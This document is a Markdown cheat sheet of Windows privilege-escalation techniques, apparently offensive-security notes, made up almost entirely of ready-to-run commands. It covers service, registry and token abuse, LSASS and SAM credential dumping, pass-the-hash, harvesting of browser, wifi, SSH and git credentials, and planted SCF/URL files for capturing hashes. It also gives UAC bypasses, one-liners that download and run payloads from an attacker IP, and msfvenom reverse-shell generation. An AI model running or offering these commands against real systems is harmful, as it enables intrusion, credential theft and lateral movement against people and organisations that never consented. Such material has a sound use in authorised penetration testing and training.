# Windows Privilege Escalation

#Privesc #Windows #PrivilegeEscalation

## What is this?

Elevating from a low-privilege shell to SYSTEM/Administrator via misconfigurations, weak permissions, vulnerable services, token abuse, or credential exposure. Goal: SYSTEM shell or admin-level access.

Common writable staging dir: `C:\Windows\Temp`

---

## Tools

| Tool | Use |
|------|-----|
| [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) | Automated enumeration, finds most common vectors |
| [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) | PowerShell — service misconfigs, weak perms |
| [SharpUp](https://github.com/GhostPack/SharpUp) | C# version of PowerUp |
| [Seatbelt](https://github.com/GhostPack/Seatbelt) | Host situational awareness, broad recon |
| [Watson](https://github.com/rasta-mouse/Watson) | Missing KBs → suggests kernel exploits |
| [WES-NG](https://github.com/bitsadmin/wesng) | `systeminfo` → exploit suggestions |
| [LaZagne](https://github.com/AlessandroZ/LaZagne) | Dumps stored creds (browsers, git, wifi, etc.) |
| [SessionGopher](https://github.com/Arvanaghi/SessionGopher) | PuTTY, WinSCP, RDP saved sessions |
| [Snaffler](https://github.com/SnaffCon/Snaffler) | Finds creds/configs in file shares |
| [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) | Sysinternals — check object permissions |
| [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) | SeImpersonate → SYSTEM (Win10/Server 2016+) |
| [RoguePotato](https://github.com/antonioCoco/RoguePotato) | SeImpersonate → SYSTEM (Server 2019+) |
| [JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG) | SeImpersonate → SYSTEM (modern systems) |
| [Mimikatz](https://github.com/gentilkiwi/mimikatz) | Credential dumping, token manipulation, PTH |
| [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) | DPAPI blob decryption |
| [keepass2john](https://github.com/openwall/john) | Extract hash from .kdbx for cracking |

---

## Initial Enumeration

### System Info

```powershell
systeminfo                                          # OS version, hotfixes, arch
wmic qfe                                            # Installed patches
Get-Hotfix | Sort-Object -Property InstalledOn      # Same via PowerShell
wmic os get osarchitecture,version,caption
```

### Network

```powershell
ipconfig /all       # NIC info, DNS
route print         # Routing table
arp -a              # ARP cache — adjacent hosts
netstat -ano        # Active connections with PIDs
```

### Users & Groups

```powershell
whoami /all                     # User, groups, privileges, integrity level — one shot
whoami /priv | findstr Enabled  # Only enabled privileges
net user                        # Local users
net user <username>             # User details
net localgroup                  # Local groups
net localgroup administrators   # Members of Administrators
query user                      # Active RDP/console sessions
```

### Processes & Services

```powershell
tasklist /svc                                           # Processes + services
sc query state= all                                     # All services
wmic service get name,pathname,startmode,startname      # Service details
Get-WmiObject -Class Win32_Service | Select Name, State, PathName
```

### Installed Software

```powershell
wmic product get name,version,vendor
Get-ChildItem "C:\Program Files", "C:\Program Files (x86)"
```

### Environment & AppLocker

```powershell
set                                                     # Env vars incl. PATH
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```

### Defender & AV

```powershell
Get-MpComputerStatus
$p = Get-MpPreference
$p.ExclusionPath; $p.ExclusionExtension     # Exclusions — potential drop paths
sc query windefend
```

---

## Service Exploits

### Unquoted Service Paths

Spaces in unquoted service binary paths — Windows tries each space-delimited prefix as an executable.

```powershell
# Find unquoted paths with spaces
wmic service get name,pathname | findstr /v '"' | findstr " "

# PowerUp
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Get-UnquotedService"
```

Drop payload at the exploitable prefix (e.g. `C:\Program Files\My\evil.exe` when path is `C:\Program Files\My App\service.exe`), then restart service.

```powershell
sc stop <ServiceName>
sc start <ServiceName>
```

### Weak Service Binary Permissions

```powershell
accesschk.exe /accepteula -wvu "C:\path\to\service.exe"
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Get-ModifiableServiceFile"
```

```powershell
copy /y evil.exe "C:\path\to\service.exe"
sc stop <ServiceName> && sc start <ServiceName>
```

### Weak Service Config Permissions

If you have `SERVICE_CHANGE_CONFIG` on the service:

```powershell
accesschk.exe /accepteula -wuvc <ServiceName>

sc config <ServiceName> binpath= "C:\Windows\Temp\evil.exe"
sc stop <ServiceName>
sc start <ServiceName>
```

### Weak Service Registry Permissions

```powershell
accesschk.exe /accepteula -kvw "HKLM\System\CurrentControlSet\Services\<ServiceName>"

reg add "HKLM\System\CurrentControlSet\Services\<ServiceName>" /v ImagePath /t REG_EXPAND_SZ /d "C:\Windows\Temp\evil.exe" /f
```

---

## Registry Exploits

### AlwaysInstallElevated

Both keys must be set to `1` — MSI installers run as SYSTEM.

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o evil.msi
```

```powershell
msiexec /quiet /qn /i C:\Windows\Temp\evil.msi
```

### Autorun Weak Permissions

```powershell
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Get-RegistryAutoRun"
```

If an autorun path is writable, replace the binary — triggers on next login.

---

## Token Privileges

### Check Privileges & Integrity Level

```powershell
whoami /priv                            # All privileges
whoami /groups | findstr "Mandatory"   # Integrity level
# Medium = standard (UAC not bypassed), High = elevated, System = SYSTEM
```

| Privilege | Abuse |
|-----------|-------|
| `SeImpersonatePrivilege` | Potato attacks / PrintSpoofer |
| `SeAssignPrimaryTokenPrivilege` | Potato attacks |
| `SeDebugPrivilege` | Dump LSASS, inject into SYSTEM processes |
| `SeBackupPrivilege` | Read any file (SAM, SYSTEM hive) |
| `SeTakeOwnershipPrivilege` | Take ownership of any object |
| `SeRestorePrivilege` | Write any file, modify registry |
| `SeLoadDriverPrivilege` | Load malicious kernel driver |
| `SeManageVolumePrivilege` | Write to any volume — overwrite system files |

### SeImpersonatePrivilege — Potato Attacks

Common on service accounts (IIS, MSSQL, Windows services).

**OS compatibility — use the right tool:**

| Tool | Target OS |
|------|-----------|
| JuicyPotato | Windows ≤ Server 2016 / Win 10 ≤ 1803 |
| PrintSpoofer | Windows 10 / Server 2016+ |
| RoguePotato | Server 2019+ |
| JuicyPotatoNG | Modern systems (replaces JuicyPotato) |

```powershell
# PrintSpoofer
.\PrintSpoofer64.exe -i -c cmd

# RoguePotato
.\RoguePotato.exe -r <AttackerIP> -e "C:\Windows\Temp\evil.exe" -l 9999

# JuicyPotatoNG
.\JuicyPotatoNG.exe -t * -p "C:\Windows\Temp\evil.exe"
```

**Via Meterpreter — incognito module:**

```
meterpreter > use incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "NT AUTHORITY\SYSTEM"
```

### SeDebugPrivilege — LSASS Dump

```powershell
# Procdump
procdump.exe /accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
```

```powershell
# Parse with Mimikatz
.\mimikatz.exe "sekurlsa::minidump C:\Windows\Temp\lsass.dmp" "sekurlsa::logonpasswords" exit
```

### SeBackupPrivilege — SAM Dump

```powershell
# Via registry
reg save HKLM\SAM C:\Windows\Temp\SAM
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM

# Via robocopy (if in Backup Operators group)
robocopy /b C:\Windows\System32\Config C:\Windows\Temp SAM SYSTEM
```

```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

**Via Shadow Copy (bypasses file locks):**

```powershell
# List shadow copies
vssadmin list shadows

# Access SAM from a shadow copy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Windows\Temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\Temp\SYSTEM
```

### SeTakeOwnershipPrivilege — Object Takeover

```powershell
# Take ownership then grant full control
takeown /f "C:\path\to\file.exe"
icacls "C:\path\to\file.exe" /grant "%username%":F

# Sticky Keys backdoor (SYSTEM cmd at login screen — press Shift x5)
takeown /f C:\Windows\System32\sethc.exe
icacls C:\Windows\System32\sethc.exe /grant "%username%":F
copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
```

---

## Windows Built-in Groups

```powershell
whoami /groups          # Check your group membership
net localgroup          # All local groups
```

### Backup Operators

SeBackupPrivilege + SeRestorePrivilege by default → SAM/SYSTEM dump (see SeBackupPrivilege above).

### Server Operators

Can start/stop/reconfigure any service → service binary replacement → SYSTEM.

```powershell
accesschk.exe /accepteula -wuvc -g "Server Operators" *
sc config <ServiceName> binpath= "C:\Windows\Temp\evil.exe"
sc stop <ServiceName> && sc start <ServiceName>
```

### Print Operators

Have `SeLoadDriverPrivilege` → load malicious kernel driver → SYSTEM.

### DnsAdmins

Configure DNS to load an arbitrary DLL as SYSTEM via the DNS service.

```bash
# Kali — generate DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o evil.dll

# Host via SMB
impacket-smbserver share /path/to/dll -smb2support
```

```powershell
# Target (requires DnsAdmins membership)
dnscmd.exe /config /serverlevelplugindll \\<AttackerIP>\share\evil.dll
sc stop dns
sc start dns
```

### Hyper-V Administrators

Full control over Hyper-V VMs — if a DC runs as a VM, clone/export it and extract NTDS.dit offline.

### Event Log Readers

```powershell
# Harvest creds from Security logs (if command-line logging is enabled — event 4688)
wevtutil qe Security /rd:true /f:text | findstr /i "password"
Get-WinEvent -LogName Security | Where-Object { $_.Message -match "password" }
```

---

## Group Policy Preferences (GPP / cpassword)

Pre-2014 GPOs stored local admin passwords in SYSVOL `Groups.xml` encrypted with a hardcoded AES key published by Microsoft.

```powershell
# Find cpassword in SYSVOL
findstr /s /i "cpassword" "\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\*.xml"

Get-ChildItem -Path "\\<DOMAIN>\SYSVOL" -Recurse -ErrorAction SilentlyContinue -Include "*.xml" |
    Select-String "cpassword"
```

```bash
# Decrypt on Kali
gpp-decrypt <cpassword_value>

# Or via CrackMapExec
crackmapexec smb <DC_IP> -u <user> -p <pass> -M gpp_password
```

---

## Mimikatz

```powershell
# Dump all logon creds from LSASS (requires SeDebugPrivilege or SYSTEM)
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

# Dump SAM hashes
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" exit

# Dump LSA secrets
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::lsa /patch" exit

# Pass the Hash — opens cmd.exe authenticated as target user
.\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:cmd.exe" exit

# Elevate token to SYSTEM
.\mimikatz.exe "privilege::debug" "token::elevate" exit
```

```bash
# Remote dump (Kali)
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<TARGET_IP>
impacket-secretsdump -hashes :<NTLM_HASH> <DOMAIN>/<USER>@<TARGET_IP>
```

---

## Pass the Hash

Once you have an NTLM hash, use it directly without cracking.

```bash
# evil-winrm (WinRM port 5985)
evil-winrm -i <TARGET_IP> -u <USER> -H <NTLM_HASH>

# impacket-psexec (SMB — drops service binary, noisy)
impacket-psexec <DOMAIN>/<USER>@<TARGET_IP> -hashes :<NTLM_HASH>

# impacket-wmiexec (WMI — semi-interactive, less noisy)
impacket-wmiexec <DOMAIN>/<USER>@<TARGET_IP> -hashes :<NTLM_HASH>

# CrackMapExec — spray hash across multiple targets
crackmapexec smb <TARGET_IP> -u <USER> -H <NTLM_HASH>
crackmapexec smb <CIDR> -u <USER> -H <NTLM_HASH> --local-auth
```

---

## Credential Hunting

### Unattended Install Files

```powershell
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattended.xml
type C:\Windows\System32\Sysprep\unattend.xml
type C:\Windows\System32\Sysprep\Panther\unattend.xml
```

### PowerShell History

```powershell
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# All users (if readable)
foreach($u in (Get-ChildItem "C:\Users")){
    $h = "$($u.FullName)\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if(Test-Path $h){ echo "=== $($u.Name) ==="; cat $h }
}
```

### Windows Credential Manager

```powershell
cmdkey /list
runas /savecred /user:<DOMAIN>\<USER> cmd.exe
.\LaZagne.exe all
```

### File Search for Passwords

```powershell
findstr /si "password" *.txt *.xml *.ini *.config *.ps1 *.bat

Get-ChildItem C:\ -Recurse -ErrorAction SilentlyContinue |
    Select-String -Pattern "password" -ErrorAction SilentlyContinue
```

### Registry Password Search

```powershell
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# AutoLogon creds
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

### DPAPI — Browser / App Creds

```powershell
.\LaZagne.exe browsers
.\SharpDPAPI.exe credentials
```

**Chrome saved passwords (manual path):**

```powershell
# SQLite DB — copy it first (Chrome locks the file when running)
copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" C:\Windows\Temp\chrome_logins
# Parse with a SQLite browser or strings
strings "C:\Windows\Temp\chrome_logins" | findstr /i "http password"
```

### FileZilla

```powershell
type "$env:APPDATA\FileZilla\recentservers.xml"
type "$env:APPDATA\FileZilla\sitemanager.xml"
Get-ChildItem "$env:APPDATA\FileZilla\" -ErrorAction SilentlyContinue
```

### Recently Accessed Files

```powershell
# Shell:recent shortcut
Get-ChildItem "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Recent\" |
    Sort-Object LastWriteTime -Descending | Select-Object -First 20 Name, LastWriteTime

# All users (if readable)
Get-ChildItem "C:\Users\*\AppData\Roaming\Microsoft\Windows\Recent\" -ErrorAction SilentlyContinue |
    Sort-Object LastWriteTime -Descending | Select-Object -First 30 FullName, LastWriteTime
```

### PuTTY / WinSCP / RDP Sessions

```powershell
powershell -ep bypass -c "Import-Module .\SessionGopher.ps1; Invoke-SessionGopher -Thorough"
reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s
```

### Group Policy Preferences

See [GPP / cpassword](#group-policy-preferences-gpp--cpassword) section above.

### KeePass

```powershell
Get-ChildItem C:\ -Recurse -Include "*.kdbx" -ErrorAction SilentlyContinue
```

```bash
keepass2john Database.kdbx > keepass.hash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt

# CVE-2023-32784 — master password recoverable from process memory (KeePass < 2.54)
# Dump lsass or KeePass process memory, then extract with PoC tool
```

### IIS / Web Configs

```powershell
type C:\inetpub\wwwroot\web.config

Get-ChildItem C:\inetpub -Recurse -Include "web.config","*.config" -ErrorAction SilentlyContinue |
    Select-String "password"
```

### Wifi Passwords

```powershell
netsh wlan show profiles

# Dump key for specific profile
netsh wlan show profile name="<ProfileName>" key=clear

# Dump all
foreach($p in (netsh wlan show profiles | Select-String "All User Profile" |
    ForEach-Object { ($_ -split ":")[1].Trim() })){
    netsh wlan show profile name="$p" key=clear
}
```

### Sticky Notes

```powershell
# SQLite DB — open with sqlite3 or just strings it
type "C:\Users\<USER>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite"
```

### SSH Keys

```powershell
Get-ChildItem C:\Users -Recurse -Include "id_rsa","id_ed25519","*.pem","*.ppk" -ErrorAction SilentlyContinue
```

### Git Credentials

```powershell
type C:\Users\<USER>\.git-credentials
Get-ChildItem C:\Users -Recurse -Include ".git-credentials" -ErrorAction SilentlyContinue
```

### SAM Hive Backups

```powershell
type C:\Windows\Repair\SAM
type C:\Windows\System32\config\RegBack\SAM
```

---

## LAPS

LAPS auto-rotates local admin passwords and stores them in AD (`ms-Mcs-AdmPwd`).

```powershell
# Check if deployed
Get-ChildItem "C:\Program Files\LAPS\CSE\Admpwd.dll" -ErrorAction SilentlyContinue
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

# Read password (requires ms-Mcs-AdmPwd read rights on the computer object)
Get-ADComputer <ComputerName> -Properties ms-Mcs-AdmPwd | Select ms-Mcs-AdmPwd

# PowerView
Get-DomainComputer <ComputerName> -Properties ms-Mcs-AdmPwd
```

```bash
crackmapexec ldap <DC_IP> -u <USER> -p <PASS> -M laps
```

---

## Interacting with Users (Hash Capture)

If you have write access to a network share that users browse, plant a malicious file to capture NTLMv2 hashes.

### SCF File

Create `@evil.scf` (the `@` sorts it to the top of the directory):

```ini
[Shell]
Command=2
IconFile=\\<AttackerIP>\share\icon
[Taskbar]
Command=ToggleDesktop
```

```bash
# Kali — capture with Responder
sudo responder -I tun0 -wv

# Crack captured hash
hashcat -m 5600 captured.hash /usr/share/wordlists/rockyou.txt
```

### URL / LNK File

```powershell
# Create malicious .url file
$content = "[InternetShortcut]`r`nURL=file://<AttackerIP>/share`r`nIconFile=\\<AttackerIP>\share\icon.ico`r`nIconIndex=1"
$content | Out-File -FilePath C:\path\to\share\@evil.url -Encoding ascii
```

When a user opens the folder in Explorer, Windows automatically requests the icon → NTLMv2 hash sent to attacker.

---

## Scheduled Tasks

```powershell
schtasks /query /fo LIST /v     # All tasks — find SYSTEM tasks with writable script/binary paths

accesschk.exe /accepteula -wvu "C:\path\to\task\binary.exe"
# If writable: replace binary, wait for schedule
```

---

## DLL Hijacking

DLL search order: application dir → System32 → Windows dir → PATH dirs.

If an app loads a missing DLL and a PATH dir is writable:

```powershell
# Find missing DLLs — Procmon on dev machine, filter: Path ends .dll, Result = NAME NOT FOUND

# Check writable PATH dirs
$env:PATH -split ";" | ForEach-Object {
    if(Test-Path $_){
        (Get-Acl $_).Access |
        Where-Object { $_.IdentityReference -match "Users|Everyone" } |
        Select-Object @{n="Dir";e={$_}},IdentityReference,FileSystemRights
    }
}
```

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o evil.dll
```

Drop `evil.dll` with the missing DLL name in the writable PATH dir, then trigger the application.

---

## UAC Bypass

### Check UAC Level

```powershell
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
# 0 = auto-elevate, 2 = secure desktop prompt, 5 = default (prompt for non-Windows binaries)
```

Must be at **Medium** integrity to need a bypass — confirm with `whoami /groups | findstr Mandatory`.

### Fodhelper

```powershell
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "C:\Windows\Temp\evil.exe" -Force
Start-Process "C:\Windows\System32\fodhelper.exe"

# Cleanup
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
```

### EventVwr

```powershell
New-Item "HKCU:\Software\Classes\mscfile\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\mscfile\Shell\Open\command" -Name "(default)" -Value "C:\Windows\Temp\evil.exe"
Start-Process "C:\Windows\System32\eventvwr.exe"
```

---

## Named Pipes

```powershell
# Enumerate
pipelist.exe /accepteula
[System.IO.Directory]::GetFiles("\\.\pipe\")

# Check ACLs
accesschk.exe /accepteula -w \pipe\<pipename> -v
```

If a privileged process connects to a pipe you control, call `ImpersonateNamedPipeClient()` to steal its token. Common targets: `\pipe\spoolss` (Print Spooler), custom service pipes.

---

## Living off the Land (LOLBAS)

Reference: [lolbas-project.github.io](https://lolbas-project.github.io)

### File Transfer

```powershell
# certutil
certutil.exe -urlcache -split -f http://<IP>/evil.exe C:\Windows\Temp\evil.exe

# bitsadmin
bitsadmin /transfer job /download /priority normal http://<IP>/evil.exe C:\Windows\Temp\evil.exe

# PowerShell
(New-Object Net.WebClient).DownloadFile('http://<IP>/evil.exe','C:\Windows\Temp\evil.exe')
Invoke-WebRequest -Uri http://<IP>/evil.exe -OutFile C:\Windows\Temp\evil.exe

# curl (Win10+)
curl http://<IP>/evil.exe -o C:\Windows\Temp\evil.exe
```

### Execution Bypasses

```powershell
# mshta
mshta http://<IP>/evil.hta

# rundll32
rundll32 shell32.dll,Control_RunDLL evil.dll

# regsvr32 (AppLocker bypass via scrobj)
regsvr32 /s /u /i:http://<IP>/evil.sct scrobj.dll

# wmic
wmic process call create "C:\Windows\Temp\evil.exe"

# PowerShell — bypass execution policy
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<IP>/evil.ps1')"
powershell -w hidden -enc <base64_command>
```

---

## Kernel Exploits

Last resort — noisy, may crash system.

```powershell
systeminfo > C:\Windows\Temp\sysinfo.txt
.\Watson.exe
```

```bash
python wes.py sysinfo.txt -i "Elevation of Privilege" --exploits-only
```

**Via Metasploit (post-exploitation):**

```
msf6 > use post/multi/recon/local_exploit_suggester
msf6 > set SESSION <id>
msf6 > run
```

---

## Payload Generation Reference

```bash
# Reverse shell EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o evil.exe

# Reverse shell DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o evil.dll

# MSI (AlwaysInstallElevated)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o evil.msi

# Meterpreter EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o meter.exe

# Listener
nc -lvnp <PORT>
```

---

## Quick Reference Checklist

```
ENUMERATION
[ ] whoami /all                          — privs + groups + integrity level
[ ] systeminfo + wmic qfe                — OS + patches
[ ] net localgroup                       — built-in group membership
[ ] tasklist /svc + wmic service         — running services

SERVICES
[ ] Unquoted service paths
[ ] Weak service binary permissions
[ ] Weak service config (sc.exe) permissions
[ ] Weak service registry key permissions

REGISTRY
[ ] AlwaysInstallElevated                — both HKCU + HKLM keys
[ ] Autorun weak permissions

TOKEN PRIVILEGES
[ ] SeImpersonatePrivilege               — Potato / PrintSpoofer (pick right tool for OS)
[ ] SeBackupPrivilege                    — SAM/SYSTEM hive dump
[ ] SeTakeOwnershipPrivilege             — takeown + icacls
[ ] SeDebugPrivilege                     — LSASS dump → Mimikatz

BUILT-IN GROUPS
[ ] Backup Operators                     — SeBackup → SAM dump
[ ] Server Operators                     — service reconfiguration
[ ] DnsAdmins                            — dnscmd DLL load
[ ] Print Operators                      — SeLoadDriver

CREDENTIALS
[ ] GPP / cpassword                      — SYSVOL Groups.xml
[ ] Unattended XML files
[ ] PowerShell history
[ ] Windows Credential Manager (cmdkey)
[ ] Registry (Winlogon AutoLogon, HKLM/HKCU password search)
[ ] IIS web.config
[ ] KeePass .kdbx files
[ ] Wifi profiles (netsh wlan)
[ ] Sticky Notes plum.sqlite
[ ] SSH keys + .git-credentials
[ ] SAM hive backups (C:\Windows\Repair\)
[ ] DPAPI / browser creds (LaZagne, SharpDPAPI)
[ ] PuTTY / WinSCP sessions (SessionGopher)

OTHER VECTORS
[ ] LAPS                                 — ms-Mcs-AdmPwd if readable
[ ] Scheduled tasks with writable binaries
[ ] DLL hijacking via writable PATH dirs
[ ] UAC level + integrity level check + bypass if needed
[ ] Named pipes — weak ACLs
[ ] Writable shares → SCF/URL file → NTLMv2 hash capture
[ ] Kernel exploits (Watson / WES-NG / local_exploit_suggester)
[ ] winPEAS for anything missed
```
